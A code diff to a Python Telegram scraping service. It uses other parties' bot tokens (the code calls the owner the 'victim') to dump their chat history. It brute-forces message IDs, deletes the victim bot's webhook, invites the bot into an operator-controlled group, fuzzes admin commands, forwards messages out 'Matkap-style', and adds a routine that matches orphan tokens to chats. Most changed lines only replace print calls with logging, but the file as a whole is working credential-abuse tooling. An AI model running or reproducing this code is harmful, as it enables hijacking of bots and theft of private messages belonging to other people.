@@ -4,6 +4,9 @@ from telethon import TelegramClient
 from telethon.sessions import MemorySession
 from telethon.tl.types import Message, MessageMediaPhoto, MessageMediaDocument
 from app.core.config import settings
+import logging
+
+logger = logging.getLogger("scraper")
 
 class ScraperService:
     def __init__(self):
@@ -29,17 +32,17 @@ class ScraperService:
                     unique_ids.add(m['telegram_msg_id'])
             
             if len(scraped_messages) > 10: # If we got a decent amount, likely success
-                print(f"✨ [Scraper] Telethon normal dump success: {len(scraped_messages)} messages.")
+                logger.info(f"✨ [Scraper] Telethon normal dump success: {len(scraped_messages)} messages.")
                 return scraped_messages
         except Exception as e:
             # Check for common "ChatAdminRequired" or "ChatWriteForbidden"
             err_str = str(e)
             if "ChatAdminRequired" in err_str:
-                print("    ⚠️ [Scraper] Telethon Restriction: Bot needs Admin to read history here.")
+                logger.warning("    ⚠️ [Scraper] Telethon Restriction: Bot needs Admin to read history here.")
             elif "API access for bot users is restricted" in err_str:
-                 print("    ⚠️ [Scraper] Telethon Restriction: Bot Privacy Mode is ON (Expected). Falling back to Strategies 2 & 3...")
+                 logger.warning("    ⚠️ [Scraper] Telethon Restriction: Bot Privacy Mode is ON (Expected). Falling back to Strategies 2 & 3...")
             else:
-                print(f"    ⚠️ [Scraper] Telethon history dump failed: {e}")
+                logger.warning(f"    ⚠️ [Scraper] Telethon history dump failed: {e}")
 
         # Get 'Anchor' ID from Bot API (Strategy 3) to enable Strategy 2
         anchor_id = 0
@@ -57,13 +60,13 @@ class ScraperService:
                         unique_ids.add(m['telegram_msg_id'])
                         if m['telegram_msg_id'] > anchor_id:
                             anchor_id = m['telegram_msg_id']
-            print(f"    [Scraper] Found anchor ID {anchor_id} from Bot API.")
+            logger.info(f"    [Scraper] Found anchor ID {anchor_id} from Bot API.")
         except Exception as e:
-            print(f"    [Scraper] Bot API fallback failed: {e}")
+            logger.warning(f"    [Scraper] Bot API fallback failed: {e}")
 
         # KICKSTART: If bot is dormant (Anchor 0), we must wake it up to get an ID.
         if anchor_id == 0:
-            print("💤 [Scraper] Bot seems dormant (No recent updates). Initiating Kickstart...")
+            logger.info("💤 [Scraper] Bot seems dormant (No recent updates). Initiating Kickstart...")
             try:
                 from app.services.user_agent_srv import user_agent
                 import requests
@@ -78,9 +81,9 @@ class ScraperService:
                 # 2. Invite to Group (Creates a Service Message -> New ID!)
                 dest = settings.MONITOR_GROUP_ID
                 if dest and bot_username != "unknown":
-                    print(f"    ⚡ [Scraper] Kickstarting: Inviting @{bot_username} to monitor group...")
+                    logger.info(f"    ⚡ [Scraper] Kickstarting: Inviting @{bot_username} to monitor group...")
                     if await user_agent.invite_bot_to_group(bot_username, dest):
-                         print("    ⏳ [Scraper] Invite sent. Starting Command Fuzzing...")
+                         logger.info("    ⏳ [Scraper] Invite sent. Starting Command Fuzzing...")
                          
                          # === TRIGGER COMMAND FUZZING ===
                          params = ["/start", "/help", "/admin", "/config", "dashboard"]
@@ -88,7 +91,7 @@ class ScraperService:
                              await user_agent.send_message(dest, cmd)
                              await asyncio.sleep(1.5) # Pace out commands
                          
-                         print("    ⏳ [Scraper] Fuzzing complete. Waiting for bot response...")
+                         logger.info("    ⏳ [Scraper] Fuzzing complete. Waiting for bot response...")
                          await asyncio.sleep(5) 
                          # ===============================
                          
@@ -101,25 +104,25 @@ class ScraperService:
                                  # because we just want ANY valid ID to start bruteforcing backwards.
                          
                          if anchor_id > 0:
-                             print(f"    ✅ [Scraper] Kickstart successful! New Anchor ID: {anchor_id}")
+                             logger.info(f"    ✅ [Scraper] Kickstart successful! New Anchor ID: {anchor_id}")
                          else:
-                             print("    ❌ [Scraper] Kickstart failed (No update received).")
+                             logger.warning("    ❌ [Scraper] Kickstart failed (No update received).")
             except Exception as e:
-                print(f"    ⚠️ [Scraper] Kickstart error: {e}")
+                logger.error(f"    ⚠️ [Scraper] Kickstart error: {e}")
 
         # Strategy 3: Blind ID Bruteforce (Telethon GetMessages)
         # If we found an anchor, we can look backwards!
         if anchor_id > 0:
             try:
-                print(f"🔨 [Scraper] Attempting Blind ID Bruteforce from ID {anchor_id} downwards...")
+                logger.info(f"🔨 [Scraper] Attempting Blind ID Bruteforce from ID {anchor_id} downwards...")
                 brute_msgs = await self._scrape_via_id_bruteforce(bot_token, chat_id, anchor_id, limit=500)
                 for m in brute_msgs:
                     if m['telegram_msg_id'] not in unique_ids:
                         scraped_messages.append(m)
                         unique_ids.add(m['telegram_msg_id'])
-                print(f"✨ [Scraper] Bruteforce added {len(brute_msgs)} messages.")
+                logger.info(f"✨ [Scraper] Bruteforce added {len(brute_msgs)} messages.")
             except Exception as e:
-                print(f"❌ [Scraper] Bruteforce failed: {e}")
+                logger.error(f"❌ [Scraper] Bruteforce failed: {e}")
 
         # Strategy 4: Blind Forwarding (Matkap Style)
         # Extremely powerful but invasive. Use if brute force yielded nothing.
@@ -128,7 +131,7 @@ class ScraperService:
                 # We need a destination. Use MONITOR_GROUP_ID if set.
                 dest_chat_id = settings.MONITOR_GROUP_ID
                 if dest_chat_id:
-                     print(f"🚀 [Scraper] Engaging Matkap-Style Forwarding (Target: {dest_chat_id})...")
+                     logger.info(f"🚀 [Scraper] Engaging Matkap-Style Forwarding (Target: {dest_chat_id})...")
                      
                      # AUTO-INVITE: Use User Agent to add bot to group
                      try:
@@ -141,7 +144,7 @@ class ScraperService:
                          me_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
                          if me_res.get("ok"):
                              victim_username = me_res["result"]["username"]
-                             print(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
+                             logger.info(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
                              
                              # CLEANUP: Remove other bots first (as requested)
                              whitelist = [x.strip() for x in settings.WHITELISTED_BOT_IDS.split(",") if x.strip()]
@@ -150,16 +153,16 @@ class ScraperService:
                                  
                              await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
                      except Exception as e_invite:
-                         print(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")
+                         logger.warning(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")
 
                      fwd_msgs = self._scrape_via_forwarding(bot_token, chat_id, dest_chat_id, anchor_id, limit=20)
                      for m in fwd_msgs:
                         if m['telegram_msg_id'] not in unique_ids:
                             scraped_messages.append(m)
                             unique_ids.add(m['telegram_msg_id'])
-                     print(f"✨ [Scraper] Forwarding added {len(fwd_msgs)} messages.")
+                     logger.info(f"✨ [Scraper] Forwarding added {len(fwd_msgs)} messages.")
              except Exception as e:
-                 print(f"❌ [Scraper] Forwarding failed: {e}")
+                 logger.error(f"❌ [Scraper] Forwarding failed: {e}")
 
         return scraped_messages
 
@@ -172,7 +175,7 @@ class ScraperService:
             if res.status_code == 200 and res.json().get("ok"):
                 return res.json()["result"]["message_thread_id"]
         except Exception as e:
-            print(f"    ⚠️ Topic create failed: {e}")
+            logger.warning(f"    ⚠️ Topic create failed: {e}")
         return 0
 
     def _scrape_via_forwarding(self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int) -> List[Dict]:
@@ -210,11 +213,11 @@ class ScraperService:
         target_thread_id = 0
         if settings.MONITOR_BOT_TOKEN:
             topic_name = f"@{bot_username} / {bot_id}"
-            print(f"    [Scraper] Creating topic '{topic_name}'...")
+            logger.info(f"    [Scraper] Creating topic '{topic_name}'...")
             target_thread_id = self._create_forum_topic(settings.MONITOR_BOT_TOKEN, to_chat_id, topic_name)
         
         if not target_thread_id:
-             print("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")
+             logger.warning("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")
 
         # Scan backwards from start_id
         for msg_id in range(start_id, max(0, start_id - limit), -1):
@@ -261,7 +264,7 @@ class ScraperService:
                         time.sleep(0.2) # Rate limit safety
                         
                 elif res.status_code == 429:
-                    print("    Rate limit hit, sleeping...")
+                    logger.warning("    Rate limit hit, sleeping...")
                     time.sleep(2)
             except Exception:
                 pass
@@ -345,10 +348,10 @@ class ScraperService:
         client = TelegramClient(MemorySession(), self.api_id, self.api_hash)
         msgs = []
         try:
-            print(f"🔐 [Scraper] Logging in as bot (Telethon)...")
+            logger.info(f"🔐 [Scraper] Logging in as bot (Telethon)...")
             await client.start(bot_token=bot_token)
             
-            print(f"📖 [Scraper] Fetching history via Telethon (Limit: {limit})...")
+            logger.info(f"📖 [Scraper] Fetching history via Telethon (Limit: {limit})...")
             
             # ATTEMPT 1: Resolve Entity explicitly
             # Fresh MemorySession needs to "eager load" the chat
@@ -356,12 +359,12 @@ class ScraperService:
             try:
                 entity = await client.get_entity(chat_id)
             except ValueError:
-                print("    ⚠️ [Scraper] Entity not found directly. Refreshing dialogs...")
+                logger.warning("    ⚠️ [Scraper] Entity not found directly. Refreshing dialogs...")
                 await client.get_dialogs(limit=100) # Populate cache
                 try:
                     entity = await client.get_entity(chat_id)
                 except:
-                    print("    ❌ [Scraper] Could not resolve entity even after dialog refresh.")
+                    logger.error("    ❌ [Scraper] Could not resolve entity even after dialog refresh.")
             
             target = entity if entity else chat_id
             
@@ -407,7 +410,7 @@ class ScraperService:
         If webhook is active, delete it first.
         """
         import requests
-        print(f"🔄 [Scraper] Attempting Bot API getUpdates fallback...")
+        logger.info(f"🔄 [Scraper] Attempting Bot API getUpdates fallback...")
         
         base_url = f"https://api.telegram.org/bot{bot_token}"
         
@@ -416,20 +419,20 @@ class ScraperService:
         
         # Check for webhook conflict error
         if res.status_code == 409 or (res.status_code == 200 and not res.json().get('ok') and 'webhook' in res.text.lower()):
-            print(f"    ⚠️ [Scraper] Webhook detected, attempting to delete...")
+            logger.warning(f"    ⚠️ [Scraper] Webhook detected, attempting to delete...")
             try:
                 # Delete the webhook
                 del_res = requests.post(f"{base_url}/deleteWebhook", timeout=10)
                 if del_res.status_code == 200 and del_res.json().get('ok'):
-                    print(f"    ✅ [Scraper] Webhook deleted successfully!")
+                    logger.info(f"    ✅ [Scraper] Webhook deleted successfully!")
                     # Retry getUpdates after deleting webhook
                     import time
                     time.sleep(1)  # Brief pause for Telegram to process
                     res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
                 else:
-                    print(f"    ❌ [Scraper] Failed to delete webhook: {del_res.text}")
+                    logger.error(f"    ❌ [Scraper] Failed to delete webhook: {del_res.text}")
             except Exception as e:
-                print(f"    ❌ [Scraper] Webhook deletion error: {e}")
+                logger.error(f"    ❌ [Scraper] Webhook deletion error: {e}")
         
         msgs = []
         if res.status_code == 200 and res.json().get('ok'):
@@ -461,7 +464,7 @@ class ScraperService:
                     "chat_id": chat.get('id')
                 })
         else:
-            print(f"    ❌ Bot API Error: {res.text}")
+            logger.error(f"    ❌ Bot API Error: {res.text}")
             
         return msgs
 
@@ -477,16 +480,16 @@ class ScraperService:
         bot_info = {}
         
         try:
-            print(f"🔍 [Discovery] Validating token {bot_token[:15]}... via Bot API")
+            logger.info(f"🔍 [Discovery] Validating token {bot_token[:15]}... via Bot API")
             
             # Step 1: Validate token with getMe
             me_res = requests.get(f"{base_url}/getMe", timeout=10)
             if me_res.status_code != 200 or not me_res.json().get('ok'):
-                print(f"    ❌ Token invalid or revoked")
+                logger.info(f"    ❌ Token invalid or revoked")
                 return {}, []
             
             bot_info = me_res.json().get('result', {})
-            print(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")
+            logger.info(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")
             
             # Step 2: Get recent chats from getUpdates
             updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
@@ -511,13 +514,13 @@ class ScraperService:
                                     "name": chat_name,
                                     "type": chat_type
                                 })
-                                print(f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})")
+                                logger.info(f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})")
                 
                 # If no updates but token is valid, use bot's own ID as fallback
                 if not discovered_chats:
                     # Token works but no recent activity - still valid!
                     # Use a placeholder to indicate token is valid but no chats found
-                    print(f"    ℹ️ Token valid but no recent chat activity")
+                    logger.info(f"    ℹ️ Token valid but no recent chat activity")
                     # Return bot info as a "chat" so validation passes
                     discovered_chats.append({
                         "id": bot_info.get('id'),
@@ -525,13 +528,35 @@ class ScraperService:
                         "type": "bot_self"
                     })
             
-            print(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")
+            logger.info(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")
             
         except requests.Timeout:
-            print(f"    ⚠️ Telegram API timeout")
+            logger.warning(f"    ⚠️ Telegram API timeout")
         except Exception as e:
-            print(f"Error discovering chats: {e}")
+            logger.error(f"Error discovering chats: {e}")
             
         return bot_info, discovered_chats
+
+    def attempt_orphan_match(self, token: str, known_chat_ids: List[int]) -> Optional[int]:
+        """
+        Try to match a token to a known chat ID by checking visibility (getChat).
+        Returns chat_id if found, else None.
+        """
+        import requests
+        logger.info(f"🕵️‍♂️ [Scraper] Orphan Token: Checking against {len(known_chat_ids)} known chats...")
+        
+        for cid in known_chat_ids:
+            try:
+                url = f"https://api.telegram.org/bot{token}/getChat"
+                res = requests.get(url, params={'chat_id': cid}, timeout=3)
+                
+                if res.status_code == 200 and res.json().get('ok'):
+                    chat = res.json()['result']
+                    name = chat.get('title') or chat.get('username') or str(cid)
+                    logger.info(f"    ✨ [Scraper] MATCH FOUND! Chat: {name} ({cid})")
+                    return cid
+            except Exception:
+                pass
+        return None
 
 scraper_service = ScraperService()
